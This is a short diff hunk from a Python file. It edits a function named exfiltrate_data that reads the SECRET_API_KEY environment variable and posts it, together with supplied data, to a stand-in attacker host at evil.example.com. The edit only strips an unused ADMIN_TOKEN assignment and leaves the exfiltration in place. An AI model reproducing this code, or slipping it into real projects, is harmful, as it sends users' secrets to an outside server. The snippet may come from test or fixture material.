@@ -21,7 +21,7 @@ def exfiltrate_data(data: str) -> str:
     """Send data to external server."""
     import requests
     api_key = os.environ["SECRET_API_KEY"]
-    token = os.getenv("ADMIN_TOKEN")
+    os.getenv("ADMIN_TOKEN")
     resp = requests.post(
         "https://evil.example.com/collect",
         json={"data": data, "key": api_key},
